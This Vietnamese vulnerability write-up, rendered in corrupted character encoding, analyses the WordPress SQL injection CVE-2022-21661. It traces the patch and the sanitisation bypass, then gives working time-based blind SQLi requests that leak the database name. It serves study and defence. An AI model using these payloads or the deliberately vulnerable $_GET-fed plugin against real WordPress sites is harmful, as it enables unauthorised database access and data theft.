ƒë∆∞·ª£c v√° trong WordPress phi√™n b·∫£n 5.8.3. C√°c phi√™n b·∫£n c≈© h∆°n b·ªã ·∫£nh h∆∞·ªüng c≈©ng ƒë√£ ƒë∆∞·ª£c s·ª≠a th√¥ng qua b·∫£n ph√°t h√†nh b·∫£o m·∫≠t, quay ng∆∞·ª£c l·∫°i ƒë·∫øn t·∫≠n phi√™n b·∫£n 3.7.37.\nCVE ID: CVE-2022-21661 Product: WordPress Vulnerability Type: SQL Injection Affected Versions: 3.7.37 ‚â§ version \u0026lt; 5.8.3 CVSS severity: High (8.0) Requirements Local WordPress and Debugging WordPress: v5.8.2(vul) Setup Required PHP Version WordPress ƒë∆∞·ª£c x√¢y d·ª±ng ho√†n to√†n b·∫±ng PHP, v√¨ v·∫≠y phi√™n b·∫£n PHP tr√™n m√°y ch·ªß c√≥ ·∫£nh h∆∞·ªüng tr·ª±c ti·∫øp ƒë·∫øn kh·∫£ nƒÉng ho·∫°t ƒë·ªông c·ªßa WordPress:\nM·ªói phi√™n b·∫£n PHP ƒë·ªÅu b·ªï sung t√≠nh nƒÉng m·ªõi v√† lo·∫°i b·ªè d·∫ßn c√°c h√†m/c√∫ ph√°p l·ªói th·ªùi. N·∫øu WordPress d√πng t√≠nh nƒÉng m·ªõi nh∆∞ng PHP tr√™n server qu√° c≈© =\u0026gt; s·∫Ω ph√°t sinh l·ªói c√∫ ph√°p (syntax error) ho·∫∑c kh√¥ng ch·∫°y ƒë∆∞·ª£c. Ng∆∞·ª£c l·∫°i, n·∫øu PHP qu√° m·ªõi, m·ªôt s·ªë h√†m c≈© m√† WordPress v·∫´n c√≤n s·ª≠ d·ª•ng c√≥ th·ªÉ ƒë√£ deprecated ho·∫∑c b·ªã lo·∫°i b·ªè ho√†n to√†n, g√¢y l·ªói khi ch·∫°y. üëâ Do ƒë√≥, c·∫ßn l·ª±a ch·ªçn phi√™n b·∫£n PHP t∆∞∆°ng th√≠ch v·ªõi phi√™n b·∫£n WordPress. Trong ph√¢n t√≠ch n√†y, ta s·ª≠ d·ª•ng PHP 7.4 ƒë·ªÉ c√†i ƒë·∫∑t WordPress 5.8.2.\nVSCode Extensions WordPress c√≥ m√£ ngu·ªìn ph·ª©c t·∫°p, n√™n vi·ªác ƒë·ªçc t·ª´ng d√≤ng code th·ªß c√¥ng l√† kh√¥ng kh·∫£ thi. ƒê·ªÉ h·ªó tr·ª£ qu√° tr√¨nh debug v√† truy v·∫øt, ta c·∫ßn c√†i ƒë·∫∑t th√™m hai extension sau trong VS Code:\nPHP Extension Pack =\u0026gt; t√¨m b·∫±ng t·ª´ kh√≥a: xdebug.php-pack PHP Tools for VS Code =\u0026gt; t√¨m b·∫±ng t·ª´ kh√≥a: devsense.phptools-vscode Custom Plugin V√¨ l·ªó h·ªïng SQLi n√†y ·∫£nh h∆∞·ªüng ƒë·∫øn WordPress Core, nh∆∞ng ch·ªâ c√≥ th·ªÉ khai th√°c gi√°n ti·∫øp th√¥ng qua plugin ho·∫∑c theme s·ª≠ d·ª•ng WP_Query, n√™n ta c·∫ßn th√¥ng qua m·ªôt plugin ho·∫∑c theme ƒë·ªÉ t·∫°o t∆∞∆°ng t√°c v·ªõi WP_Query.\nTa x√¢y d·ª±ng plugin s·ª≠ d·ª•ng WP_Query, hi·ªÉn th·ªã query ƒë∆∞·ª£c th·ª±c thi th√¥ng qua WP_Query::request.\n\u0026lt;?php /** * Plugin Name: Demo WP_Query * Description: Plugin demo WP_Query * Version: 1.0 * Author: w41bu1 */ if (!defined(\u0026#39;ABSPATH\u0026#39;)) exit; function da_show_posts() { $args = [ \u0026#39;post_type\u0026#39; =\u0026gt; \u0026#39;post\u0026#39;, \u0026#39;tax_query\u0026#39; =\u0026gt; [ [ \u0026#39;taxonomy\u0026#39; =\u0026gt; \u0026#39;category\u0026#39;, \u0026#39;field\u0026#39; =\u0026gt; \u0026#39;term_taxonomy_id\u0026#39;, \u0026#39;terms\u0026#39; =\u0026gt; [1,2,3], \u0026#39;operator\u0026#39; =\u0026gt; \u0026#39;IN\u0026#39;, ], ], ]; $query = new WP_Query($args); ob_start(); echo \u0026#39;\u0026lt;h3\u0026gt;Demo WP_Query\u0026lt;/h3\u0026gt;\u0026#39;; echo \u0026#39;\u0026lt;pre style=\u0026#34;background:#f0f0f0; padding:15px; width:100%; white-space:pre-wrap; word-wrap:break-word; overflow:auto;\u0026#34;\u0026gt;\u0026#39;; echo \u0026#34;SQL query generated by WP_Query:\\n\\n\u0026#34;; echo esc_html($query-\u0026gt;request); // Display excuted query echo \u0026#39;\u0026lt;/pre\u0026gt;\u0026#39;; if ($query-\u0026gt;have_posts()) { echo \u0026#39;\u0026lt;ul\u0026gt;\u0026#39;; while ($query-\u0026gt;have_posts()) { $query-\u0026gt;the_post(); echo \u0026#39;\u0026lt;li\u0026gt;\u0026#39; . get_the_title() . \u0026#39; (\u0026#39; . get_the_ID() . \u0026#39;)\u0026lt;/li\u0026gt;\u0026#39;; } echo \u0026#39;\u0026lt;/ul\u0026gt;\u0026#39;; } else { echo \u0026#39;\u0026lt;p\u0026gt;No posts found.\u0026lt;/p\u0026gt;\u0026#39;; } wp_reset_postdata(); return ob_get_clean(); } add_shortcode(\u0026#39;demo_wp_query\u0026#39;, \u0026#39;da_show_posts\u0026#39;); Taxonomy parameters\nT·∫°o page m·ªõi v·ªõi \u0026lt;page-title\u0026gt; c√≥ shortcode :\n[demo_wp_query] üëâ Truy v·∫•n s·∫Ω ƒë∆∞·ª£c hi·ªÉn th·ªã khi truy c·∫≠p http://localhost/\u0026lt;page-title\u0026gt;\nAnalysis wpdb\nL√† l·ªõp PHP c·ªët l√µi c·ªßa WordPress d√πng ƒë·ªÉ thao t√°c tr·ª±c ti·∫øp v·ªõi MySQL. Cho ph√©p l·∫≠p tr√¨nh vi√™n vi·∫øt v√† th·ª±c thi c√¢u SQL th√¥. WP_Query\nL√† m·ªôt l·ªõp tr·ª´u t∆∞·ª£ng h√≥a gi√∫p l·∫•y d·ªØ li·ªáu b√†i vi·∫øt (post) t·ª´ database m√† kh√¥ng c·∫ßn vi·∫øt SQL tr·ª±c ti·∫øp. L·∫≠p tr√¨nh vi√™n ch·ªâ c·∫ßn truy·ªÅn v√†o m·∫£ng tham s·ªë (args), WordPress s·∫Ω t·ª± ƒë·ªông d·ª±ng c√¢u SQL ph√π h·ª£p. M·ªëi quan h·ªá\nWP_Query kh√¥ng tr·ª±c ti·∫øp truy v·∫•n MySQL. Thay v√†o ƒë√≥, n√≥ x√¢y d·ª±ng c√¢u SQL d·ª±a tr√™n args, √°p d·ª•ng c√°c b∆∞·ªõc ki·ªÉm tra/validate, r·ªìi g·ªçi $wpdb ƒë·ªÉ th·ª±c thi. Patch Diff WordPress l√† m·ªôt d·ª± √°n m√£ ngu·ªìn m·ªü v·ªõi kho l∆∞u tr·ªØ ƒë∆∞·ª£c c√¥ng khai tr√™n GitHub. V√¨ v·∫≠y, m·ªçi b·∫£n v√° ƒë·ªÅu ƒë∆∞·ª£c commit tr·ª±c ti·∫øp t·∫°i ƒë√¢y. Do ƒë√≥, ƒë·ªÉ ph√¢n t√≠ch m·ªôt l·ªó h·ªïng, ta ch·ªâ c·∫ßn t√¨m ƒë·∫øn commit li√™n quan v√† quan s√°t s·ª± thay ƒë·ªïi trong m√£ ngu·ªìn.\nTrong ph·∫ßn reference c·ªßa CVE-2022-21661, c√≥ li√™n k·∫øt ƒë·∫øn commit tr√™n GitHub:\nL·ªó h·ªïng ƒë∆∞·ª£c v√° trong file src/wp-includes/class-wp-tax-query.php\nB·∫£n l·ªói\n$query[\u0026#39;terms\u0026#39;] = array_unique( (array) $query[\u0026#39;terms\u0026#39;] ); √âp $query['terms'] th√†nh m·∫£ng v√† lo·∫°i b·ªè gi√° tr·ªã tr√πng l·∫∑p. Kh√¥ng c√≥ b∆∞·ªõc ki·ªÉm tra ho·∫∑c √©p ki·ªÉu d·ªØ li·ªáu, d·∫´n ƒë·∫øn nguy c∆° ch√®n d·ªØ li·ªáu kh√¥ng h·ª£p l·ªá v√†o truy v·∫•n SQL. V√≠ d·ª•:\n$args = [ \u0026#39;post_type\u0026#39; =\u0026gt; \u0026#39;post\u0026#39;, \u0026#39;tax_query\u0026#39; =\u0026gt; [ [ \u0026#39;taxonomy\u0026#39; =\u0026gt; \u0026#39;category\u0026#39;, \u0026#39;field\u0026#39; =\u0026gt; \u0026#39;term_taxonomy_id\u0026#39;, \u0026#39;terms\u0026#39; =\u0026gt; [\u0026#39;1) AND (SELECT SLEEP(5)) # \u0026#39;], \u0026#39;operator\u0026#39; =\u0026gt; \u0026#39;IN\u0026#39;, ], ], ]; B·∫£n v√°\nif ( \u0026#39;slug\u0026#39; === $query[\u0026#39;field\u0026#39;] || \u0026#39;name\u0026#39; === $query[\u0026#39;field\u0026#39;] ) { $query[\u0026#39;terms\u0026#39;] = array_unique( (array) $query[\u0026#39;terms\u0026#39;] ); } else { $query[\u0026#39;terms\u0026#39;] = wp_parse_id_list( $query[\u0026#39;terms\u0026#39;] ); } B·ªï sung ƒëi·ªÅu ki·ªán d·ª±a v√†o $query['field']: N·∫øu l√† slug ho·∫∑c name =\u0026gt; gi·ªØ nguy√™n c√°ch x·ª≠ l√Ω c≈©. N·∫øu l√† ID =\u0026gt; d√πng wp_parse_id_list() ƒë·ªÉ √©p ki·ªÉu d·ªØ li·ªáu th√†nh m·∫£ng s·ªë nguy√™n an to√†n. Ta bi·∫øt ƒë√¢y l√† b∆∞·ªõc √©p ki·ªÉu d·ªØ li·ªáu th√†nh m·∫£ng s·ªë nguy√™n b·ªüi v√¨ trong tax_query1, tham s·ªë field ch·ªâ nh·∫≠n 4 gi√° tr·ªã: slug, name, term_taxonomy_id v√† term_id. Trong ƒë√≥, hai tr∆∞·ªùng term_taxonomy_id v√† term_id thu·ªôc b·∫£ng wp_term_taxonomy v√† ƒë·ªÅu c√≥ ki·ªÉu d·ªØ li·ªáu BIGINT UNSIGNED. {: .prompt-tip }\nmysql\u0026gt; DESC wp_term_taxonomy; +------------------+-----------------+------+-----+---------+----------------+ | Field | Type | Null | Key | Default | Extra | +------------------+-----------------+------+-----+---------+----------------+ | term_taxonomy_id | bigint unsigned | NO | PRI | NULL | auto_increment | | term_id | bigint unsigned | NO | MUL | 0 | | | taxonomy | varchar(32) | NO | MUL | | | | description | longtext | NO | | NULL | | | parent | bigint unsigned | NO | | 0 | | | count | bigint | NO | | 0 | | +------------------+-----------------+------+-----+---------+----------------+ 6 rows in set (0.01 sec) How it work? V·ªã tr√≠ l·ªó h·ªïng n·∫±m trong h√†m clean_query c·ªßa class WP_Tax_Query thu·ªôc file src/wp-includes/class-wp-tax-query.php\nprivate function clean_query( \u0026amp;$query ) { if ( empty( $query[\u0026#39;taxonomy\u0026#39;] ) ) { if ( \u0026#39;term_taxonomy_id\u0026#39; !== $query[\u0026#39;field\u0026#39;] ) { $query = new WP_Error( \u0026#39;invalid_taxonomy\u0026#39;, __( \u0026#39;Invalid taxonomy.\u0026#39; ) ); return; } // So long as there are shared terms, \u0026#39;include_children\u0026#39; requires that a taxonomy is set. $query[\u0026#39;include_children\u0026#39;] = false; } elseif ( ! taxonomy_exists( $query[\u0026#39;taxonomy\u0026#39;] ) ) { $query = new WP_Error( \u0026#39;invalid_taxonomy\u0026#39;, __( \u0026#39;Invalid taxonomy.\u0026#39; ) ); return; } $query[\u0026#39;terms\u0026#39;] = array_unique( (array) $query[\u0026#39;terms\u0026#39;] ); // \u0026lt;== Vulnerability location if ( is_taxonomy_hierarchical( $query[\u0026#39;taxonomy\u0026#39;] ) \u0026amp;\u0026amp; $query[\u0026#39;include_children\u0026#39;] ) { $this-\u0026gt;transform_query( $query, \u0026#39;term_id\u0026#39; ); if ( is_wp_error( $query ) ) { return; } $children = array(); foreach ( $query[\u0026#39;terms\u0026#39;] as $term ) { $children = array_merge( $children, get_term_children( $term, $query[\u0026#39;taxonomy\u0026#39;] ) ); $children[] = $term; } $query[\u0026#39;terms\u0026#39;] = $children; } $this-\u0026gt;transform_query( $query, \u0026#39;term_taxonomy_id\u0026#39; ); } {: file=\u0026ldquo;src/wp-includes/class-wp-tax-query.php v5.8.2\u0026rdquo; }\nTrong h√†m clean_query, tham s·ªë $query ƒë∆∞·ª£c truy·ªÅn theo tham chi·∫øu (c√≥ d·∫•u \u0026amp;). Do ƒë√≥, m·ªçi thay ƒë·ªïi tr√™n bi·∫øn $query b√™n trong h√†m s·∫Ω t√°c ƒë·ªông tr·ª±c ti·∫øp ƒë·∫øn bi·∫øn $query g·ªëc ƒë∆∞·ª£c truy·ªÅn v√†o t·ª´ b√™n ngo√†i.\nPayload ƒë∆∞·ª£c truy·ªÅn v√†o th√¥ng qua $query['terms']. Trong h√†m clean_query, gi√° tr·ªã n√†y s·∫Ω ƒë∆∞·ª£c x·ª≠ l√Ω v√† l√†m s·∫°ch.\nüëâ V√¨ v·∫≠y, ƒë·ªÉ khai th√°c th√†nh c√¥ng, payload trong $query['terms'] c·∫ßn v∆∞·ª£t qua to√†n b·ªô c∆° ch·∫ø ki·ªÉm tra v√† l·ªçc c·ªßa clean_query tr∆∞·ªõc khi ƒë·∫øn b∆∞·ªõc th·ª±c thi SQL.\nDebugging Do logic c·ªßa WordPress Core kh√° ph·ª©c t·∫°p, ta c·∫ßn s·ª≠ d·ª•ng debugger ƒë·ªÉ ph√¢n t√≠ch. ƒê·∫∑t breakpoint t·∫°i ƒë·∫ßu h√†m clean_query, sau ƒë√≥ nh·∫•n F5 ƒë·ªÉ b·∫Øt ƒë·∫ßu debug.\nKhi truy c·∫≠p http://localhost/\u0026lt;page-title\u0026gt;, debugger s·∫Ω d·ª´ng t·∫°i h√†m clean_query.\nL·∫ßn ƒë·∫ßu, WordPress th·ª±c hi·ªán query v·ªõi taxonomy = wp_theme (kh√¥ng ph·∫£i gi√° tr·ªã ta truy·ªÅn v√†o). Nh·∫•n F5 th√™m m·ªôt l·∫ßn ƒë·ªÉ b·ªè qua, debugger s·∫Ω ƒë·∫øn query c√≥ taxonomy kh·ªõp v·ªõi gi√° tr·ªã ta truy·ªÅn v√†o.\nV√¨ $query['taxonomy'] t·ªìn t·∫°i n√™n truy v·∫•n v∆∞·ª£t qua c√°c nh√°nh if/elseif ban ƒë·∫ßu trong clean_query. Ti·∫øp t·ª•c debug, ƒëi·ªÅu ki·ªán k·∫ø ti·∫øp ƒë∆∞·ª£c th·ªèa m√£n =\u0026gt; ta nh·∫£y v√†o h√†m transform_query v·ªõi tham s·ªë:\n$query (tham chi·∫øu t·ªõi query hi·ªán t·∫°i) $resulting_field = 'term_id' (gi√° tr·ªã fix c·ª©ng) Nh·∫•n F11 ƒë·ªÉ step into v√†o transform_query.\npublic function transform_query( \u0026amp;$query, $resulting_field ) { // other logic if ( $query[\u0026#39;field\u0026#39;] == $resulting_field ) { return; } // Empty \u0026#39;terms\u0026#39; always results in a null transformation. // other logic $args = array( \u0026#39;get\u0026#39; =\u0026gt; \u0026#39;all\u0026#39;, \u0026#39;number\u0026#39; =\u0026gt; 0, \u0026#39;taxonomy\u0026#39; =\u0026gt; $query[\u0026#39;taxonomy\u0026#39;], \u0026#39;update_term_meta_cache\u0026#39; =\u0026gt; false, \u0026#39;orderby\u0026#39; =\u0026gt; \u0026#39;none\u0026#39;, ); // Term query parameter name depends on the \u0026#39;field\u0026#39; being searched on. switch ( $query[\u0026#39;field\u0026#39;] ) { case \u0026#39;slug\u0026#39;: break; // other logic default: $args[\u0026#39;include\u0026#39;] = wp_parse_id_list( $terms ); break; } $term_query = new WP_Term_Query(); $term_list = $term_query-\u0026gt;query( $args ); if ( is_wp_error( $term_list ) ) { $query = $term_list; return; } // other logic $query[\u0026#39;terms\u0026#39;] = wp_list_pluck( $term_list, $resulting_field ); $query[\u0026#39;field\u0026#39;] = $resulting_field; } {: file=\u0026ldquo;src/wp-includes/class-wp-tax-query.php v5.8.2\u0026rdquo; }\nT·∫°i ƒë√¢y, $query['terms'] b·ªã ghi ƒë√® b·ªüi k·∫øt qu·∫£ c·ªßa wp_list_pluck.\nüëâ Mu·ªën gi·ªØ nguy√™n payload trong $query['terms'], ta ph·∫£i tr√°nh ƒë·ªÉ n√≥ b·ªã g√°n l·∫°i. C√≥ 2 c√°ch:\nPh√¢n t√≠ch wp_list_pluck ƒë·ªÉ xem c√≥ l·ªó h·ªïng bypass. K·∫øt th√∫c s·ªõm transform_query b·∫±ng c√°ch l·ª£i d·ª•ng ƒëi·ªÅu ki·ªán (focus): if ( $query[\u0026#39;field\u0026#39;] == $resulting_field ) { return; } Trong h√†m clean_query, ·ªû l·∫ßn g·ªçi transform_query ƒë·∫ßu ti√™n, $resulting_field = 'term_id' (kh√°c v·ªõi gi√° tr·ªã ta truy·ªÅn v√†o l√† 'term_taxonomy_id')\nTuy nhi√™n, ·ªü cu·ªëi clean_query, transform_query ƒë∆∞·ª£c g·ªçi l·∫°i v·ªõi:\n$this-\u0026gt;transform_query( $query, \u0026#39;term_taxonomy_id\u0026#39; ); L√∫c n√†y, $resulting_field tr√πng kh·ªõp v·ªõi $query['field'] m√† ta truy·ªÅn v√†o ('term_taxonomy_id'), n√™n h√†m s·∫Ω return s·ªõm, kh√¥ng ghi ƒë√® $query['terms'].\nüëâ Ch·ªâ c·∫ßn b·ªè qua ƒëi·ªÅu ki·ªán if th·ª© 2 trong clean_query, th√¨ ƒë·∫øn cu·ªëi h√†m, transform_query() s·∫Ω return s·ªõm khi $resulting_field == $query['field']. Khi ƒë√≥, payload trong $query['terms'] v·∫´n nguy√™n v·∫πn, kh√¥ng b·ªã thay ƒë·ªïi.\nTa ch·ªâ c·∫ßn th√™m $query['include_children'] v·ªõi gi√° tr·ªã false th√¨ ƒëi·ªÅu ki·ªán if s·∫Ω kh√¥ng x·∫£y ra.\n$args = [ \u0026#39;post_type\u0026#39; =\u0026gt; \u0026#39;post\u0026#39;, \u0026#39;tax_query\u0026#39; =\u0026gt; [ [ \u0026#39;taxonomy\u0026#39; =\u0026gt; \u0026#39;category\u0026#39;, \u0026#39;field\u0026#39; =\u0026gt; \u0026#39;term_taxonomy_id\u0026#39;, \u0026#39;terms\u0026#39; =\u0026gt; [\u0026#39;payload\u0026#39;], \u0026#39;operator\u0026#39; =\u0026gt; \u0026#39;IN\u0026#39;, \u0026#39;include_children\u0026#39; =\u0026gt; false ], ], ]; Thay ƒë·ªïi $args trong plugin c·ªßa ta, t·∫Øt debugger sau ƒë√≥ truy c·∫≠p v√†o http://localhost/\u0026lt;page-title\u0026gt;, quan s√°t c√¢u query th·ª±c s·ª± nguy√™n v·∫πn.\nüëâ Th√†nh c√¥ng ki·ªÉm so√°t payload.\nFlow ƒê·ªÉ hi·ªÉu r√µ ƒë∆∞·ª£c lu·ªìng g·ªçi h√†m, ta c·∫ßn ph√¢n t√≠ch callstack c·ªßa debugger.\nƒê·∫ßu ti√™n, ƒë·ªëi t∆∞·ª£ng WP_Query ƒë∆∞·ª£c t·∫°o v·ªõi ƒë·ªëi s·ªë $args ch·ª©a terms do ta ki·ªÉm so√°t\n__construct c·ªßa WP_Query ƒë∆∞·ª£c g·ªçi sau ƒë√≥ g·ªçi ƒë·∫øn h√†m query\nquery th·ª±c hi·ªán parse args v·ªõi ƒë·ªëi s·ªë $query sau ƒë√≥ g·ªçi h√†m get_posts\nget_posts ki·ªÉm tra c√¢u ƒëi·ªÅu ki·ªán v√† g·ªçi get_sql l√†m gi√° tr·ªã tr·∫£ v·ªÅ cho $clauses n·∫øu ƒëi·ªÅu ki·ªán ƒë√∫ng. Quan s√°t Variable \u0026gt; Local \u0026gt; $this(WP_Query) \u0026gt; is_singular b√™n debugger tab, is_singular c√≥ gi√° tr·ªã false n√™n c√¢u ƒëi·ªÅu ki·ªán ƒë√∫ng, get_sql ƒë∆∞·ª£c g·ªçi.\nget_sql tr·∫£ v·ªÅ gi√° tr·ªã c·ªßa get_sql_clauses\nget_sql_clauses g·ªçi ƒë·∫øn get_sql_for_query v·ªõi ƒë·ªëi s·ªë l√† tham chi·∫øu ƒë·∫øn $queries\nget_sql_for_query duy·ªát qua m·∫£ng $query ki·ªÉm tra c√°c $key, n·∫øu $key kh√¥ng ph·∫£i relation th√¨ ki·ªÉm tra ƒëi·ªÅu ki·ªán is_first_order_clause c·ªßa $claude\nN·∫øu $clause c√≥ 1 trong c√°c key sau:\n$keys = [\u0026#39;terms\u0026#39;, \u0026#39;taxonomy\u0026#39;, \u0026#39;include_children\u0026#39;, \u0026#39;field\u0026#39;, \u0026#39;operator\u0026#39;] Th√¨ get_sql_for_clause s·∫Ω ƒë∆∞·ª£c g·ªçi v·ªõi ƒë·ªëi s·ªë $clause v√† $query\nget_sql_for_clause g·ªçi ƒë·∫øn clean_query ƒë·ªÉ l√†m s·∫°ch $clause, nh∆∞ng ta ƒë√£ bypass =\u0026gt; terms trong $clause kh√¥ng thay ƒë·ªïi.\n$where ƒë∆∞·ª£c g√°n gi√° tr·ªã ch·ª©a payload terms do ta ki·ªÉm so√°t, v√† ƒë∆∞·ª£c g√°n v√†o $sql tr·∫£ v·ªÅ.\n$sql['where'] ƒë∆∞·ª£c g√°n l·∫°i gi√° tr·ªã tr∆∞·ªõc khi tr·∫£ v·ªÅ.\nget_sql_for_query nh·∫≠n $sql tr·∫£ v·ªÅ t·ª´ get_sql_for_clause, th√™m () v√†o $sql['where'] v√† tr·∫£ v·ªÅ cho get_sql_clauses\nget_sql_clauses th√™m AND v√†o $sql['where'] v√† tr·∫£ v·ªÅ cho get_sql.\nget_sql tr·∫£ v·ªÅ gi√° tr·ªã l·∫•y t·ª´ get_sql_clauses\nget_posts l·∫•y gi√° tr·ªã tr·∫£ v·ªÅ t·ª´ get_sql g√°n cho $clauses\n$where ƒë∆∞·ª£c concat v·ªõi gi√° tr·ªã $clauses['where']\nüëâ get_posts l√† h√†m ch√≠nh th·ª±c thi SQL query b·∫±ng $wpdb ƒë·ªÉ bi·∫øt c√¢u query ƒë∆∞·ª£c th·ª±c thi ·ªü ƒë√¢u, ta ƒë·∫∑t breakpoint t·∫°i n∆°i c√≥ $wpdb trong get_posts, quan s√°t $wpdb \u0026gt; last_query (ch·ª©a c√¢u l·ªánh th·ª±c thi g·∫ßn nh·∫•t) v√† li√™n t·ª•c F10 ƒë·ªÉ debugger ch·∫°y ƒë·∫øn n∆°i th·ª±c thi query.\nL·ªói \u0026quot;Unknown column 'payload' in 'where clause'\u0026quot; xu·∫•t hi·ªán t·∫°i tab debugger ch·ª©a n·ªôi dung c·ªßa payload\nüëâ $where ch·ª©a payload ƒë∆∞·ª£c th√™m v√†o $this-\u0026gt;request t·∫°i d√≤ng 3012 v√† th·ª±c thi t·∫°i d√≤ng 3026 b·∫±ng $wpdb-\u0026gt;get_col()\nChart\nExploit Ta t√πy ch·ªânh gi√° tr·ªã c·ªßa terms ƒë·ªÉ m√¥ ph·ªèng tr∆∞·ªùng h·ª£p terms truy·ªÅn v√†o c√≥ th·ªÉ ki·ªÉm so√°t b·ªüi attacker\n\u0026#39;terms\u0026#39; =\u0026gt; [$_GET[\u0026#39;terms\u0026#39;]], Detect SQLi Thay gi√° tr·ªã c·ªßa terms b·∫±ng payload SQLi v√† g·ª≠i request qua Burp Suite:\nGET /demo/?terms=1)+AND+(SELECT+1+FROM+(SELECT+SLEEP(5))a)+%23+ HTTP/1.1 C·∫•u query th·ª±c s·ª±:\nSELECT SQL_CALC_FOUND_ROWS wp_posts.ID FROM wp_posts LEFT JOIN wp_term_relationships ON (wp_posts.ID = wp_term_relationships.object_id) WHERE 1=1 AND ( wp_term_relationships.term_taxonomy_id IN (1) AND (SELECT 1 FROM (SELECT SLEEP(5))a) # ) ) AND wp_posts.post_type = \u0026#39;post\u0026#39; AND (wp_posts.post_status = \u0026#39;publish\u0026#39;) GROUP BY wp_posts.ID ORDER BY wp_posts.post_date DESC LIMIT 0, 10 üëâ D·ª±a tr√™n th·ªùi gian ph·∫£n h·ªìi =\u0026gt; payload ho·∫°t ƒë·ªông.\nGi·∫£i th√≠ch k·ªπ thu·∫≠t (subquery trong m·ªánh ƒë·ªÅ FROM):\nPayload d√πng m·ªôt subquery trong m·ªánh ƒë·ªÅ FROM: FROM (SELECT SLEEP(5)) a. MySQL ph·∫£i th·ª±c thi truy v·∫•n con tr∆∞·ªõc, t·∫°o ra m·ªôt b·∫£ng t·∫°m t·ª´ k·∫øt qu·∫£ c·ªßa subquery, r·ªìi m·ªõi ti·∫øp t·ª•c th·ª±c thi truy v·∫•n ch√≠nh. SELECT SLEEP(5) s·∫Ω l√†m cho truy v·∫•n con ch·∫≠m 5 gi√¢y ‚Äî do ƒë√≥ th·ªùi gian tr·∫£ v·ªÅ c·ªßa c·∫£ truy v·∫•n tƒÉng t∆∞∆°ng ·ª©ng, cho th·∫•y payload ƒë∆∞·ª£c th·ª±c thi. L∆∞u √Ω v·ªÅ cache v√† s·ªë l∆∞·ª£ng h√†ng (rows):\nMySQL c√≥ th·ªÉ t·ªëi ∆∞u/cached m·ªôt s·ªë k·∫øt qu·∫£ con; trong tr∆∞·ªùng h·ª£p c·ª• th·ªÉ n√†y SELECT SLEEP(5) ch·ªâ c·∫ßn th·ª±c thi 1 l·∫ßn ƒë·ªÉ t·∫°o b·∫£ng t·∫°m, n√™n th·∫•y ƒë√∫ng m·ªôt l·∫ßn ƒë·ªô tr·ªÖ. N·∫øu ph·∫ßn tr∆∞·ªõc c·ªßa bi·ªÉu th·ª©c AND tr·∫£ v·ªÅ nhi·ªÅu h√†ng v√† payload ƒë∆∞·ª£c l·ªìng theo c√°ch g√¢y l·∫∑p, th·ªùi gian tr·∫£ v·ªÅ c√≥ th·ªÉ tƒÉng theo c·∫•p s·ªë (t·ª©c l√† nh√¢n l√™n theo s·ªë h√†ng), d·∫´n t·ªõi ƒë·ªô tr·ªÖ l·ªõn h∆°n nhi·ªÅu ‚Äî v√¨ truy v·∫•n con c√≥ th·ªÉ b·ªã th·ª±c thi cho m·ªói h√†ng t√πy c√°ch optimizer x·ª≠ l√Ω truy v·∫•n. Get First Letter of Database Name ƒêi·ªÅu ki·ªán ti√™n quy·∫øt ƒë·ªÉ dump ƒë∆∞·ª£c h·∫øt data l√† ph·∫£i dump ƒë∆∞·ª£c 1 k√Ω t·ª± b·∫•t k·ª≥ c·ªßa t√™n database, n·∫øu l·∫•y ƒë∆∞·ª£c th√¨ g·∫ßn nh∆∞ to√†n b·ªô data ƒë·ªÅu dump ƒë∆∞·ª£c.\nThay gi√° tr·ªã c·ªßa terms b·∫±ng payload SQLi v√† g·ª≠i request qua Burp Suite:\nGET /demo/?terms=1)+AND+(SELECT+1+FROM+(SELECT+IF(SUBSTRING(SCHEMA(),1,1)=0x77,SLEEP(5),0))a)+%23+ HTTP/1.1 S·ª≠ d·ª•ng SUBSTRING() ƒë·ªÉ l·∫•y k√Ω t·ª± ƒë·∫ßu ti√™n c·ªßa database name, IF() tr·∫£ v·ªÅ SLEEP(5) n·∫øu k√Ω t·ª± ƒë√≥ l√† 0x77(w)\nüëâ D·ª±a tr√™n th·ªùi gian ph·∫£n h·ªìi =\u0026gt; k√≠ t·ª± ƒë·∫ßu ti√™n ƒë√∫ng l√† w.\nConclusion L·ªó h·ªïng CVE-2022-21661 trong WordPress Core tr∆∞·ªõc phi√™n b·∫£n 5.8.3, quay ng∆∞·ª£c ƒë·∫øn t·∫≠n phi√™n b·∫£n 3.7.37, xu·∫•t ph√°t t·ª´ vi·ªác l√†m s·∫°ch d·ªØ li·ªáu (sanitization) kh√¥ng ƒë√∫ng c√°ch trong WP_Query d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\nB·∫£n v√° ƒë√£ √©p ki·ªÉu d·ªØ li·ªáu th√†nh m·∫£ng s·ªë nguy√™n an to√†n tr∆∞·ªõc khi ƒë∆∞a v√†o c√¢u query ƒë·ªÉ th·ª±c thi.\nKey takeaways:\nKi·ªÉm so√°t k·ªπ input t·ª´ ng∆∞·ªùi d√πng. Lu√¥n s·ª≠ d·ª•ng $wpdb-\u0026gt;prepare() khi l√†m vi·ªác v·ªõi database trong WordPress ƒë·ªÉ tr√°nh SQL Injection. Th∆∞·ªùng xuy√™n c·∫≠p nh·∫≠t WordPress v√† ki·ªÉm tra b·∫£o m·∫≠t ƒë·ªÉ tr√°nh tr·ªü th√†nh m·ª•c ti√™u t·∫•n c√¥ng. References SQL Injection cheat sheet - PortSwigger\nCVE-2022-21661 Detail Notes V√¨ patch n·∫±m trong file src/wp-includes/class-wp-tax-query.php File n√†y ƒë·ªãnh nghƒ©a class WP_Tax_Query, ch·ªãu tr√°ch nhi·ªám x·ª≠ l√Ω tham s·ªë tax_query trong WP_Query. V√¨ th·∫ø, n·∫øu c√≥ thay ƒë·ªïi trong file n√†y th√¨ g·∫ßn nh∆∞ ch·∫Øc ch·∫Øn n√≥ li√™n quan ƒë·∫øn qu√° tr√¨nh parse/validate c·ªßa tax_query.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","permalink":"//localhost:1313/vi/posts/2025-09-15-cve-2022-21661/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eDo vi·ªác l√†m s·∫°ch d·ªØ li·ªáu (\u003cstrong\u003esanitization\u003c/strong\u003e) kh√¥ng ƒë√∫ng c√°ch trong \u003ccode\u003eWP_Query\u003c/code\u003e, c√≥ nh·ªØng tr∆∞·ªùng h·ª£p c√≥ th·ªÉ x·∫£y ra \u003cstrong\u003eSQL Injection\u003c/strong\u003e th√¥ng qua c√°c \u003cstrong\u003eplugin\u003c/strong\u003e ho·∫∑c \u003cstrong\u003etheme\u003c/strong\u003e s·ª≠ d·ª•ng n√≥ theo m·ªôt 